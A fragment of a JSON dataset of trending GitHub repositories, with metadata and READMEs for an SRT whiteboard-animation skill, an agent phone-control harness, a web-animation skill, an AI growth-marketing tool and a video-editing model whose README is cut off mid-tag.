+      "readme": "# SRT 白板动画 Skill\n\n将 SRT 字幕转为按叙事顺序绘制的白板手绘视频Skill。它结合了**分区遮罩编排**与**流式笔迹绘制**：每个元素跟随字幕依次出场，笔尖在区域内连续落墨，再逐步添彩，最终导出 MP4。\n\n适合把知识讲解、故事口播、课程字幕或短视频文案制作成暖米黄色纸张底的手绘动画。\n\n## 效果示例\n\n**场景：猴子山抢香蕉** —— 随着字幕的叙事顺序，依次绘制假山与小猴、抢香蕉的大猴，以及围观小朋友。\n\n![猴子山抢香蕉：SRT 白板动画演示](examples/scene-01-monkey-mountain-stream.gif)\n\n原始线稿：[查看 PNG](examples/scene-01-monkey-mountain.png)。\n\n## 核心能力\n\n- 解析 SRT 字幕，并按建议的 25–35 秒时长拆分场景\n- 先输出分镜与配图策略，确保每一幕只表达一个核心意思\n- 按字幕事件而非画面坐标，为元素建立语义化的绘制顺序\n- 用 `annotation.json` 管理区域、时序、字幕关联和重叠保护区\n- 每个区域采用连续流式笔迹：先 `ink` 铺线稿，再 `color` 添彩\n- 支持浏览器预览台调整区域、顺序、时间和字幕关联\n- 支持逐幕渲染与多幕合并，输出完整 MP4\n\n## 工作方式\n\n该 Skill 的关键在于“字幕驱动、逐步确认”。每一步完成后都等待确认，避免在分镜、线稿或标注尚未定稿时浪费渲染成本：\n\n1. 解析 SRT，输出分镜与配图策略。\n2. 确认后生成统一风格的线稿。\n3. 确认线稿后，结合字幕和原图创建标注，并载入预览台。\n4. 确认标注后，生成分区与方向检查图。\n5. 在预览台调整区域、叙事顺序、时序和字幕关联并保存。\n6. 确认最终标注后，逐幕渲染 MP4。\n7. 多幕项目在确认各幕成片后合并。\n\n## 视觉规范\n\n- 暖米黄色纸张背景：建议 `#F5EBD7`\n- 深灰色素描线条，红、橙、蓝仅作少量概念性点缀\n- 极简手绘、干净背景与充足留白\n- 不使用场景文字、标签、摄影感、3D 效果或复杂纹理\n\n## 安装与环境\n\nSkill 自带独立的 Python 虚拟环境准备脚本。首次运行时执行：\n\n```bash\npython scripts/prepare_env.py --check\npython scripts/prepare_env.py\n```\n\n成功后第一条命令会输出 `ENV_PY=<路径>`；后续渲染请使用该解释器，确保依赖隔离。\n\n## 项目素材结构\n\n```text\nassets/whiteboard/<项目名>/\n├── scene-01-<名称>.png\n├── scene-01-<名称>.annotation.json\n├── scene-01-<名称>-whiteboard.mp4\n└── scene-01-<名称>-preview.mp4\n```\n\n图片与标注必须同名，例如 `scene-01-demo.png` 对应 `scene-01-demo.annotation.json`。\n\n## 标注格式\n\n每个元素使用原图的整数像素坐标，并通过 `sequence`、`subtitle` 与 `narrativeRole` 关联字幕中的事件。区域应按“场景铺垫 → 关键人物/物体 → 动作或变化 → 反应/结果”排序。\n\n```json\n{\n  \"sceneId\": \"scene-01\",\n  \"canvas\": { \"width\": 1672, \"height\": 941 },\n  \"storyBasis\": \"小猴在猴子山上拿着香蕉，大猴抢走香蕉，孩子们在旁观看。\",\n  \"sceneDurationMs\": 9000,\n  \"elements\": [\n    {\n      \"id\": \"rockery\",\n      \"label\": \"猴子山场景\",\n      \"sequence\": 1,\n      \"narrativeRole\": \"故事的场景铺垫\",\n      \"subtitle\": \"小猴子坐在猴子山顶，手里拿着香蕉。\",\n      \"type\": \"structure\",\n      \"region\": { \"x\": 20, \"y\": 120, \"width\": 540, \"height\": 780 },\n      \"reveal\": {\n        \"direction\": \"top_to_bottom\",\n        \"startMs\": 300,\n        \"durationMs\": 2600,\n        \"maskPaddingPx\": 22,\n        \"protectedRegions\": []\n      },\n      \"handPath\": { \"start\": [290, 130], \"end\": [290, 890], \"easing\": \"easeInOut\" }\n    }\n  ]\n}\n```\n\n`direction` 和 `handPath` 用于预览台的矩形代理；最终成片的真实笔迹由流式绘制器自动生成。对于相互遮挡的对象，在较早元素的 `protectedRegions` 中标出需要延后显示的区域，避免后续内容提前露出。\n\n## 常用命令\n\n解析字幕并生成建议分镜：\n\n```bash\npython scripts/parse_srt.py <字幕.srt> --target-sec 30 --min-sec 25 --max-sec 35\n```\n\n生成区域检查图：\n\n```bash\npython scripts/render_annotation_preview.py <图片路径> <标注路径> <预览图输出路径>\n```\n\n打开 `assets/preview.html`，使用“打开文件夹”载入场景目录，即可编辑区域、顺序、时间与字幕关联。\n\n渲染单幕：\n\n```bash\n<ENV_PY> scripts/render_stream_whiteboard.py <图片路径> <标注路径> <输出.mp4> assets/drawing-hand.png \\\n  --ink-path grid --color-fill contour-wipe\n```\n\n合并多幕：\n\n```bash\n<ENV_PY> scripts/merge_scenes.py --inputs 幕1.mp4 幕2.mp4 幕3.mp4 --output final.mp4\n```\n\n## 质量检查\n\n- 首帧是干净的暖米黄纸张底色，没有提前露出的线条\n- `canvas` 与原图尺寸一致，所有区域都是画布内的整数像素坐标\n- `sequence`、`startMs` 与字幕的叙事顺序一致\n- 中段帧中，未开始区域和保护区不会提前出现\n- 笔尖贴近当前流式笔迹；线稿清晰时可选择 `--ink-path skeleton`\n- 每幕结束后至少停留 0.5 秒完整画面；多幕合并顺序与字幕分镜一致\n\n## 仓库内容\n\n```text\nsrt-whiteboard-animation/\n├── SKILL.md                         # 完整工作流与约束\n├── assets/\n│   ├── drawing-hand.png              # 手部素材\n│   ├── preview.html                  # 本地编辑预览台\n├── examples/                         # README 案例素材\n├── scripts/\n│   ├── parse_srt.py                  # 字幕解析与分镜建议\n│   ├── render_annotation_preview.py  # 标注检查图\n│   ├── render_stream_whiteboard.py   # 流式笔迹 MP4 渲染器\n│   ├── merge_scenes.py               # 多幕合并\n│   └── prepare_env.py                # 依赖环境准备\n└── agents/openai.yaml                # Codex 元数据\n```\n\n## 贡献\n\n欢迎提交 Issue 或 Pull Request。任何涉及绘制逻辑的改动，都应使用真实的字幕、标注和成片检查遮罩保护、时序与最终画面。\n\n## 许可证\n\n本项目基于 MIT License 开源，详见 [LICENSE](LICENSE)。\n\n## 关于作者\n\n一个爱养鱼的老登 / AI Builder / 用 AI 团队打造一人公司。\n\n抖音、B站、公众号：江哥是老登啊\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:20.340552"
+  },
+  {
+    "basic_info": {
+      "name": "phone-harness",
+      "full_name": "ShawnPana/phone-harness",
+      "owner": "ShawnPana",
+      "description": "let your agent control your phone",
+      "url": "https://github.com/ShawnPana/phone-harness",
+      "clone_url": "https://github.com/ShawnPana/phone-harness.git",
+      "ssh_url": "git@github.com:ShawnPana/phone-harness.git",
+      "homepage": "",
+      "created_at": "2026-08-07T22:28:53Z",
+      "updated_at": "2026-08-22T17:25:28Z",
+      "pushed_at": "2026-08-21T20:42:59Z"
+    },
+    "stats": {
+      "stars": 1984,
+      "forks": 183,
+      "watchers": 1984,
+      "open_issues": 25,
+      "size": 193
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 124246,
+        "Shell": 165
+      },
+      "license": "MIT License",
+      "topics": [
+        "agent",
+        "ai",
+        "automation",
+        "developer-tools"
+      ]
+    },
+    "content": {
+      "readme": "# Phone Harness 📱\n\n**[phone-harness](https://phone-harness.com)** · let your agent control your phone.\n\nConnect an AI agent — Claude Code, Codex, or any LLM — directly to your real\nphone with a thin, editable harness. **iPhone** through the Mac's iPhone\nMirroring window, or **Android** over adb (USB or Wi‑Fi). No jailbreak, no\nXcode, no WebDriverAgent, no app on the phone.\n\nThe Mac is the whole transport. iPhone: `screencapture` + Vision-framework OCR\nfor eyes, HID-level CGEvents for hands. Android: `screencap` for eyes plus the\nphone's own accessibility tree — exact text, exact boxes — and `input` for\nhands. Nothing between the agent and the phone. The agent writes what's\nmissing during execution in `agent-workspace/agent_helpers.py`.\n\n```\n  ● agent: wants to open Weather\n  │\n  ● ocr() → \"Weather\" at (400, 468)\n  │\n  ● tap(400, 468) → wait_stable() → ocr() confirms the forecast\n  ✓ done\n```\n\n**Your phone, driven by an agent.**\n\n## Setup prompt\n\nPaste into Claude Code or Codex:\n\n```text\nSet up phone-harness for me. Clone https://github.com/ShawnPana/phone-harness into ~/.phone-harness (its canonical home), read `install.md` first, install it so `phone-harness` is a command on my PATH, and register it as an agent skill named phone-harness using `phone-harness skill` as the body, so you reach for it automatically. Then read `SKILL.md` for normal usage, and always read `src/phone_harness/helpers.py` because that is where the functions are. Then read `onboarding.md` and walk me through it.\n```\n\nThe agent then follows [onboarding.md](onboarding.md): it asks one thing —\nwhich phone is your default, iPhone or Android — and walks you through only\nwhat needs your hands. **iPhone:** pairing iPhone Mirroring once, and granting\nthe terminal **Accessibility** and **Screen Recording** in System Settings →\nPrivacy & Security (Screen Recording takes effect after the terminal restarts).\n**Android:** turning on Developer options, then either plugging in and tapping\nAllow, or Wireless debugging + one 6‑digit pairing code. Then\n`phone-harness --doctor` verifies the chain, and `phone-harness config set\nplatform ios|android` sets the default (both can be set up).\n\nA fresh machine may prompt for more permissions the first time an action runs\n— if `--doctor` passes but taps or capture silently do nothing, watch for a\nmacOS prompt. See [install.md](install.md) for details.\n\n## Why this works\n\n**iPhone.** iPhone Mirroring (macOS Sequoia+) renders the phone as a Mac window\nand forwards real mouse and keyboard input as touches. That gives an agent\neverything it needs for real-device iOS automation:\n\n- **See** — capture just the mirroring window, OCR it with Apple's Vision\n  framework: every visible string with a tap-ready coordinate. The poor man's\n  DOM.\n- **Act** — CGEvents posted at the HID tap: taps, long-presses, drags/flicks,\n  scroll gestures, unicode typing, and the app's own shortcuts (Cmd+1 Home,\n  Cmd+2 App Switcher, Cmd+3 Spotlight). For icon-only controls found in a\n  screenshot, use `tap_image_point(x, y, image_size=...)`: screenshot coordinates\n  are image pixels, while `tap(x, y)` expects global Mac screen points.\n  `image_point()` performs the conversion when a raw `tap()` is needed.\n- **Verify** — screenshot again. No DOM means the capture is the ground truth.\n\nThings that do NOT work, learned the hard way: AppleScript `click at` (silently\nignored — the window is a video stream with no accessibility tree), unicode key\npayloads (mirroring forwards raw HID keycodes, so typing must use keycodes), a\nslow touch-drag (barely moves an iOS list — use wheel scroll for lists, a fast\nflick for pages), and input while the window isn't frontmost (swallowed).\n\n**Android.** adb reaches the phone directly, over USB or Wi‑Fi — no window, no\nfocus, nothing on the Mac has to be in front. `screencap` is the capture; the\nphone's own accessibility tree (`uiautomator`) is the text source, so `ocr()`\nreturns exact strings and boxes and `tap_ui(\"url_bar\")` finds elements OCR\nnever could; `input tap/swipe/text` are the hands; Back exists. Coordinates\nare device pixels, so a screenshot is 1:1 with `tap(x, y)`. The harness finds\nthe phone itself (a plugged-in one first, else the paired Wi‑Fi phone),\nrefuses to drive a locked one, and can keep it awake for a session without\ntouching a setting. Same helpers, same agent code.\n\n## Usage\n\n```bash\n./phone-harness <<'PY'\nopen_app(\"Notes\")\ntap_text(\"New Note\")\ntype_text(\"hello from the harness\")\nprint([o[\"text\"] for o in ocr()][:10])\nPY\n```\n\nDay-to-day workflow lives in [SKILL.md](SKILL.md), which [install.md](install.md)\nregisters as an agent skill (`phone-harness skill` prints the body) so the agent\nreaches for it on its own.\n\n## Architecture\n\n- `SKILL.md` — day-to-day usage (the agent-facing product surface)\n- `onboarding.md` — the first-run flow the agent walks the user through\n- `install.md` — setup reference and troubleshooting\n- `src/phone_harness/` — protected core:\n  - `transport.py` — the one",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:21.673834"
+  },
+  {
+    "basic_info": {
+      "name": "oil-motion",
+      "full_name": "oil-oil/oil-motion",
+      "owner": "oil-oil",
+      "description": "Create smooth, responsive interactive web animations.",
+      "url": "https://github.com/oil-oil/oil-motion",
+      "clone_url": "https://github.com/oil-oil/oil-motion.git",
+      "ssh_url": "git@github.com:oil-oil/oil-motion.git",
+      "homepage": null,
+      "created_at": "2026-08-07T12:36:33Z",
+      "updated_at": "2026-08-23T02:11:07Z",
+      "pushed_at": "2026-08-21T06:34:03Z"
+    },
+    "stats": {
+      "stars": 1981,
+      "forks": 155,
+      "watchers": 1981,
+      "open_issues": 2,
+      "size": 3089
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 231372,
+        "HTML": 34075,
+        "TypeScript": 29044
+      },
+      "license": "MIT License",
+      "topics": []
+    },
+    "content": {
+      "readme": "<p align=\"center\">\n  <img src=\"./assets/readme/hero.svg\" width=\"100%\" alt=\"Oil Motion 把 AI 生成的连续动作接入网页交互\">\n</p>\n\n**English**: [README.en.md](./README.en.md) · **中文**: README.md\n\nOil Motion 是一个 Agent 通用的交互动画 Skill。它负责设计动作、生成连续画面、整理动画资源，并把最终效果接入页面滚动、鼠标、拖动、触摸或设备方向。\n\n使用时只需要说明希望表达什么、提供哪些素材，以及动画应该跟随什么操作。具体的生成、检查、压缩和前端实现由 Agent 完成。\n\n## 演示\n\nhttps://github.com/user-attachments/assets/08e26ad6-ca23-4f31-ac53-44c7692ba99d\n\n## 安装\n\n告诉 Agent：帮我安装「https://github.com/oil-oil/oil-motion」这个 Skill。\n\n## 适合实现的动画\n\n- 页面向下滚动时，产品逐步展开、拆解或切换状态。\n- 鼠标移动时，角色、宠物或产品自然地调整朝向。\n- 拖动进度时，动画跟随手势前进、后退或停在指定位置。\n- 在手机上使用触摸或设备方向控制画面。\n- 点击、悬停或组件状态变化时，播放对应的动作。\n- 没有操作时自然播放，用户开始操作后切换为跟随模式。\n\n这些动画可以用于产品介绍、角色互动、操作演示、数据变化和章节转场。Oil Motion 同时处理动作连贯性、画面清晰度、加载体积和移动端表现。\n\n## 工作原理\n\nAI 生成的视频需要先被整理成稳定时间轴，再根据交互目标选择控制方式：输入值可以持续对应动画进度，也可以只触发一段正常播放的转场，或让动画按时间自主播放。滚动、鼠标和状态切换只是输入来源，不直接决定播放方式。\n\n完整过程如下：\n\n```text\n参考素材、表达目的和控制方式\n  ↓\n先确认开始、中间和结束时应该是什么样子\n  ↓\n使用 AI 视频生成这些画面之间的连续动作\n  ↓\n逐帧检查，删除停顿、重复和异常画面\n  ↓\n按照页面中的实际显示大小整理并压缩资源\n  ↓\n把滚动、鼠标、拖动、触摸或设备方向对应到动画进度\n```\n\n这套流程分成三个部分。\n\n### 先确认关键画面\n\n关键画面是动作过程中必须保持准确的几个状态，例如产品完整、零件展开和最终拆解。Agent 会先生成并检查这些画面，确认主体身份、结构、Logo、构图和风格没有变化。\n\n如果直接生成整段视频，模型可能在过程中改变产品结构、角色比例或动作终点。先确认关键画面，可以让连续动作有明确的起点、过程和终点。\n\n### 再生成连续动作\n\n关键画面确认后，AI 视频负责生成它们之间的变化。肢体转动、产品变形、材质变化和前后遮挡都在这个阶段完成，因为这些变化只靠前端移动或缩放图片通常不自然。\n\n位移、缩放、裁切、播放速度、跟随阻尼和最大转动速度由程序控制。这些变化不需要交给视频模型重新生成，程序处理会更稳定，也方便后续调整。\n\n### 最后转换成可控制的网页资源\n\n生成的视频需要经过整理才能用于交互。Agent 会检查每个画面，裁掉开头和结尾的停顿，删除近似重复画面，找出闪烁或结构变化，并根据页面中的实际显示大小进行压缩。\n\n处理完成后，浏览器不会在用户操作时重新生成视频，而是在已经准备好的连续画面中定位或播放。这样可以让动画及时响应输入，也能避免每次交互出现不同结果。\n\n## 资源形式\n\nAgent 会先锁定 Concept Contract：主体、风格、动作、背景归属、交互输入、时间控制和连续性要求逐项确认，不擅自扩写。背景归属决定是否把场景烧入视频；参数空间、访问方式和设备预算决定资源形式；时间控制单独决定逐帧 scrub、分段播放或自主播放。\n\n| 使用情况 | 常用形式 | 原因 |\n| --- | --- | --- |\n| 场景叙事、镜头运动、环境光与地面接触重要 | 烘焙场景全关键帧 MP4 | 背景与主体同视频生成，连续性最好，没有抠色风险 |\n| 透明复用：小型、环形、二维或频繁跳转 | Alpha WebP 图集 | 构建时完成抠色，随机访问响应稳定 |\n| 透明复用：大尺寸、长时间轴、一维滚动 | 绿幕全关键帧 MP4 | WebGL 实时抠色，压缩率高，避免大型图集占用大量内存 |\n\nAgent 会先运行预算脚本并直接采用最合适的一种主方案，不会把形式选择交给使用者，也不会重复实现两套。量产之前还会先完成首屏 Pilot：一对关键帧、一段短视频、挂载到真实页面验收通过后生成带工件哈希的批准文件；后续片段缺少批准文件或首尾帧 SHA-256 不一致时，生成脚本会在联网前阻断。\n\n压缩会依据页面中的实际显示尺寸进行。展示区域较大时保留更高分辨率；展示区域较小时减少不必要的数据。文件大小和清晰度发生冲突时，优先保证页面中的实际观感。\n\n## 快速开始\n\n已经有素材和动作方向时，可以直接说明：\n\n```text\n使用 $oil-motion，把这两张产品图制作成随页面滚动逐步展开的动画。\n桌面端的展示区域较大，需要保持清晰；移动端使用较轻的资源。\n```\n\n只有产品素材，还没有动作方案时，可以让 Agent 先完成设计：\n\n```text\n使用 $oil-motion，为这个产品首页设计一个随滚动变化的连续动画。\n先提供三个方向，分别说明它们表达什么、如何跟随滚动，以及实现成本。\n确认方向以后再生成关键画面和视频。\n```\n\n角色或宠物需要跟随鼠标时，可以说明运动范围和期望感受：\n\n```text\n使用 $oil-motion，让这个角色跟随鼠标调整朝向。\n动作需要及时响应，同时限制转动速度，快速反向时不能闪烁或抽动。\n```\n\n## Agent 会判断什么\n\n在开始制作前，Agent 会确认以下内容：\n\n- 动画要表达的内容，以及它在页面中的作用。\n- 主体的身份、结构、比例和不能改变的部分。\n- 动画由滚动、鼠标、拖动、触摸还是其他状态控制。\n- 动作是一条前后变化的路径，还是需要同时响应水平和垂直方向。\n- 页面中的实际显示大小，以及桌面端和移动端是否需要不同资源。\n- 动画尚未加载、加载失败或用户关闭动态效果时显示什么。\n\n如果鼠标的水平位置和垂直位置都会改变主体姿态，就需要准备二维方向的画面。只使用一段左右往返的视频，无法准确表达上下和远近变化。\n\n## 交付内容\n\n根据项目需要，Agent 会交付其中一部分或全部内容：\n\n- 已确认的关键画面和生成提示词。\n- 可以继续处理的原始视频。\n- 删除停顿、重复和异常画面后的动画资源。\n- 适合桌面端与移动端加载的图集或视频。\n- 可以直接接入项目的交互代码。\n- 展示完整画面、当前帧和交互输入的原理预览页。\n- 动画资源、交互范围和加载方式的配置文件。\n\n这些文件会保留生成、处理和验收所需的信息，方便后续修改动作、替换画面或调整交互参数。\n\n## 质量检查\n\n交付前需要检查：\n\n- 主体身份、产品结构、比例、位置和光线在连续画面中保持一致。\n- 没有多余肢体、部件复制、硬切、闪帧和异常停顿。\n- 透明素材的边缘干净，内部白色区域和细线没有被误删。\n- 快速滚动、快速反向和频繁移动鼠标时，动画不粘滞、不抽动、不越界。\n- 页面滚动、缩放或设备旋转后，输入位置与动画方向仍然对应。\n- 初次加载时有清晰的首帧，资源加载失败时可以回退到静态画面。\n- 最终资源放进真实页面以后仍然清晰，移动端不会因为资源过大而明显卡顿。\n- 用户选择减少动态效果时，页面可以显示静态替代内容。\n\n程序可以处理轻微漂移、颜色差异、重复画面和编码问题，但无法修复错误的动作设计。发现主体结构、肢体关系或动作方向错误时，需要重新调整关键画面或生成视频。\n\n## 第一次生成动画\n\n第一次需要生成动画时，Agent 会引导配置所需的 API Key。密钥只保存在本机，之后会自动读取，不需要重复输入。\n\n## 技术资料\n\n日常使用不需要手动运行脚本。如果需要修改生成参数、资源处理方式或网页运行逻辑，可以继续查看 [`SKILL.md`](./SKILL.md) 和 [`references/`](./references/)。\n\n## License\n\n[MIT](./LICENSE)\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:22.974509"
+  },
+  {
+    "basic_info": {
+      "name": "growth-lab",
+      "full_name": "tsingyuai/growth-lab",
+      "owner": "tsingyuai",
+      "description": "An end-to-end growth tool that understands the product, fetch the data it needs, researches the market, executes campaigns, and reviews results to improve the next round of growth. 从代码到市场的开源端到端增长工具。理解产品、接入信息渠道、研究市场、执行增长行动，并基于真实数据自我改进。",
+      "url": "https://github.com/tsingyuai/growth-lab",
+      "clone_url": "https://github.com/tsingyuai/growth-lab.git",
+      "ssh_url": "git@github.com:tsingyuai/growth-lab.git",
+      "homepage": "https://growthlab.tsingyuai.com",
+      "created_at": "2026-07-24T05:33:56Z",
+      "updated_at": "2026-08-22T13:33:37Z",
+      "pushed_at": "2026-08-11T04:56:57Z"
+    },
+    "stats": {
+      "stars": 1813,
+      "forks": 164,
+      "watchers": 1813,
+      "open_issues": 0,
+      "size": 900
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 76265,
+        "JavaScript": 33324,
+        "PowerShell": 5435,
+        "Makefile": 808
+      },
+      "license": "Apache License 2.0",
+      "topics": [
+        "agentic-marketing",
+        "ai-agent",
+        "claude-code",
+        "codex",
+        "growth",
+        "growth-hacking",
+        "marketing-automation",
+        "open-source",
+        "seo",
+        "skills",
+        "xiaohongshu"
+      ]
+    },
+    "content": {
+      "readme": "<div align=\"center\">\n\n# 🧪 Growth Lab\n\n<p>用自然语言运行产品运营和用户增长闭环：理解产品，发现真实需求，采取行动，再从结果中找到下一步。</p>\n\n[![GitHub stars](https://img.shields.io/github/stars/tsingyuai/growth-lab?style=for-the-badge&logo=github&color=071a2b)](https://github.com/tsingyuai/growth-lab/stargazers)\n[![开源](https://img.shields.io/badge/OPEN_SOURCE-YES-2667FF?style=for-the-badge)](https://github.com/tsingyuai/growth-lab)\n\n[官网](https://growthlab.tsingyuai.com)\n\n[简体中文](./README.md) · [English](./README.en.md) · [繁體中文](./docs/readmes/README.zh-Hant.md) · [Français](./docs/readmes/README.fr.md) · [Español](./docs/readmes/README.es.md) · [Русский](./docs/readmes/README.ru.md) · [Português](./docs/readmes/README.pt.md) · [Deutsch](./docs/readmes/README.de.md) · [日本語](./docs/readmes/README.ja.md) · [한국어](./docs/readmes/README.ko.md) · [Türkçe](./docs/readmes/README.tr.md) · [Tiếng Việt](./docs/readmes/README.vi.md) · [Polski](./docs/readmes/README.pl.md)\n\n</div>\n\n## 为什么做 Growth Lab\n\n大多数 AI 增长工具只解决一个局部问题：有的生成文案，有的研究竞品，有的负责发布，有的展示数据。产品上下文在不同工具之间反复丢失，真正重要的决策仍散落在仪表盘、文档、Prompt 和人工交接中。\n\n增长是一个持续学习的闭环：\n\n```text\n理解产品\n→ 判断用户与市场\n→ 研究渠道与内容\n→ 制定策略\n→ 生成与分发\n→ 收集真实结果\n→ 学习并调整下一步行动\n```\n\n现代 Coding Agent 已经能够读取代码仓库、搜索网络、操作工具、编辑文件、跨上下文推理，并在会话中与人协作。Growth Lab 以 Codex 和 Claude Code 作为应用 Runtime，将这些能力组织成端到端的增长工作流。\n\n## 产品模型\n\n```text\n会话 = 控制面\nCodex 或 Claude Code = Runtime\nSkill = 增长方法与工作指引\nClient = 外部执行能力\n文件系统 = 长期记忆\n```\n\nSkill 教 Runtime 如何理解产品、开展研究、选择工具、形成策略、制作内容、分析反馈和决定下一步。Client 工具让 Runtime 能够使用浏览器、官方 API、数据导出、内容平台和素材生成等外部能力。文件跨会话保存产品上下文、研究资料、决策与结果。\n\nAI 会话负责控制整个工作流程。\n\n每个 Model 都是一个“观察—行动—复盘”闭环。每个 Model 都拥有独立的持久化 Memory，用来积累按时间采集的运营数据、分析、行动结果和下一步建议。下一轮工作在开始观察前读取这些 Memory。\n\n闭环方法论保存在 Model 中，并通过直接修改 Skill 与 references 持续演进。Memory 记录 Model 被实际使用后发生了什么。\n\n## Growth Lab 有什么不同\n\n### 覆盖每个增长渠道的完整生命周期\n\nGrowth Lab 的设计目标是覆盖全部增长渠道，从理解机会、选择行动，到执行、度量和决定下一步。目前已经支持 SEO 页面增长，以及小红书内容采集、爆款研究、创作、生图、卡片渲染、合规检查和发布结果复盘。\n\n### 通过自然语言持续协作\n\n自动化不等于一个永远脱离人类运行的后台程序。用户用自然语言持续提出目标、接收已经完成的工作与结果、提供反馈，再让 Agent 继续跟进。对话就是操作入口。\n\n### 连接信息、方法与执行\n\n增长信息通常留在报表中，方法存在于专家经验中，执行散落在不同工具里。Growth Lab 把三者放进同一个工作区，让 Agent 获取证据、应用方法、完成行动，再把真实结果带进下一轮。\n\n### 开源、数据归用户、让知识自由流动\n\nGrowth Lab 完全开源，产品资料、运营数据、Memory 和产物都保存在用户自己的工作区。它不持有用户数据，不通过私有格式和封闭流程制造迁移壁垒；它致力于让有效的增长知识可以被检查、修改和自由使用。\n\n## 如何使用\n\n```bash\ngit clone https://github.com/tsingyuai/growth-lab.git\ncd growth-lab\n```\n\n使用 Codex 或 Claude Code 打开该目录，然后询问 Growth Lab 能做什么，或直接描述你希望实现的增长结果。\n\n示例：\n\n```text\n你能做什么？\n\n理解这个产品，并运行它的第一个增长闭环。\n\n采集小红书上与这个产品相关的高表现内容，选择可迁移的结构，完成一篇图文稿和配图。\n\n复盘最近的结果，然后执行下一步增长行动。\n```\n\nRuntime 会读取已有 Model，建立缺失的产品和市场上下文，调用相关 Collector 与 Executor，并把证据、结果、产物和下一步行动写回工作区。\n\n### 如何接入你的产品\n\n用自然语言告诉 AI 你的产品仓库链接，或者现有资料放在哪里。AI 会先读取能够确认的产品事实；尚未被证据支持的用户、问题和价值会保留为待验证项，并在后续增长闭环中逐步补充。\n\n### 通过自然语言完成配置\n\nGrowth Lab 使用一个统一的 [onboarding Skill](models/onboard-growth-lab/SKILL.md) 审计所有能力依赖，不要求用户学习额外命令或打开配置页面。你可以直接问 Agent：\n\n```text\n检查 Growth Lab 现在还缺哪些配置。\n帮我配置小红书采集和生图；SEO 相关能力暂时跳过。\n```\n\nAgent 会检查 API key、第三方 Client、外部仓库、浏览器与登录态，解释缺少的配置从哪里取得，再让你决定配置或本轮绕过。小红书使用本机 browser-first `xiaohongshu-mcp`，首次默认推荐 25 条；AI 生图需要 OpenAI 或 Gemini 其中一组本地凭据。详细字段、配置位置和删除方法见 [CONFIGURATION.md](CONFIGURATION.md)。第三方 Client 与登录态仍保存在仓库外；密钥、cookie 和认证 profile 不进入 Memory。\n\n方法与可执行脚本保存在对应 Collector / Executor / Model Skill 中。仓库不分发私有产品资料、历史采样、生成产物和运营 Memory；用户实际运行某个 Model 时，再由它创建自己的 Memory 命名空间。\n\n## 系统组成\n\n- 面向需求、竞品、内容与产品增长数据的 Collector；\n- 协调“观察—行动—复盘”闭环与持久化 Memory 的 Model Skill；\n- 面向创作、发布、人类协作与复盘的 Executor Skill；\n- 展示完整增长过程的示例工作区。\n\n## 现有能力\n\n一个能力就是一个完整的“观察—行动—复盘”闭环，每个闭环对应一个 Model。Model 协调所需的 Collector 和 Executor，并把运营证据、执行结果与下一步行动保存在自己的 Memory 中。\n\n| 名称 | 介绍 | 实测效果 |\n|---|---|---|\n| [SEO 页面增长闭环](models/run-seo-page-loop/SKILL.md) | 思考用户在什么场景下可能会需要你的产品，调研这些场景中用户会实际搜索什么，生成具有信息量、能解决用户问题，并引流到产品的 SEO 页面。 | 在我们自己的实测中，新页面执行后 1–2 天被收录；按 7 日平均口径，整体 CTR 降低 50%，页面曝光量和点击量均提高 1000%。 |\n| [小红书爆款复刻与复盘闭环](models/xhs-replicate/SKILL.md) | 协调采集、创作、降 AI 味、截图、生图、卡片渲染、合规检查和发布结果复盘。 | 所创作的商业化内容，单篇最高获得 [4000+ 赞/收藏、700+ 评论](http://xhslink.cn/o/37uik9K9WHr)。真实发布仍由人完成。 |\n\n这些数字记录了一次实际运行结果，并作为后续迭代的证据。具体效果会受到产品、域名、搜索需求、页面质量、站点权重和观察窗口影响。\n\n## 当前状态\n\nGrowth Lab 已实现 SEO 页面增长闭环，并提供小红书复刻与结果复盘工作流。可复用 Skill、脚本、CLI 和自动检查工具保存在各自能力目录；私有产品数据、样本、截图、生成帖子与历史 Memory 均不随仓库分发。小红书发布继续保持人工边界。\n\n如果你认同这个方向，欢迎提交 Issue，告诉我们你正在增长什么产品、当前工作流断在哪里，以及你希望 Runtime 能够使用哪些工具。\n\n## License\n\nGrowth Lab 使用 [Apache License 2.0](./LICENSE) 开源。\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:24.423000"
+  },
+  {
+    "basic_info": {
+      "name": "JoyAI-Video-Edit",
+      "full_name": "jd-opensource/JoyAI-Video-Edit",
+      "owner": "jd-opensource",
+      "description": "[Official Repo] JoyAI-Video-Edit: Real-Time Open-Ended Video Editing with Autoregressive Diffusion",
+      "url": "https://github.com/jd-opensource/JoyAI-Video-Edit",
+      "clone_url": "https://github.com/jd-opensource/JoyAI-Video-Edit.git",
+      "ssh_url": "git@github.com:jd-opensource/JoyAI-Video-Edit.git",
+      "homepage": "",
+      "created_at": "2026-08-04T08:22:24Z",
+      "updated_at": "2026-08-22T23:56:08Z",
+      "pushed_at": "2026-08-21T11:08:56Z"
+    },
+    "stats": {
+      "stars": 1636,
+      "forks": 73,
+      "watchers": 1636,
+      "open_issues": 9,
+      "size": 20961
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 369206,
+        "HTML": 119873,
+        "Cuda": 83640,
+        "C++": 3328,
+        "Shell": 2760,
+        "C": 972
+      },
+      "license": "Apache License 2.0",
+      "topics": []
+    },
+    "content": {
+      "readme": "<h1 align=\"center\">JoyAI-Video-Edit</h1>\n<h3 align=\"center\">Real-Time Open-Ended Video Editing with Autoregressive Diffusion</h3>\n\n<p align=\"center\">\n  <a href=\"https://arxiv.org/pdf/2608.03974\"><img src=\"https://img.shields.io/badge/Paper-arXiv-red\" alt=\"Paper\"></a>\n  <a href=\"#\"><img src=\"https://img.shields.io/badge/Project-JoyAI--Video--Edit-333399\" alt=\"Project\"></a>\n  <a href=\"https://huggingface.co/jdopensource/JoyAI-Video-Edit\"><img src=\"https://img.shields.io/badge/%F0%9F%A4%97%20Checkpoint-JoyAI--Video--Edit-yellow\" alt=\"Hugging Face\"></a>\n  <a href=\"https://huggingface.co/spaces/wxDai/joyai-video-edit\"><img src=\"https://img.shields.io/badge/%F0%9F%9A%80%20Demo-Streaming--V2V-orange\" 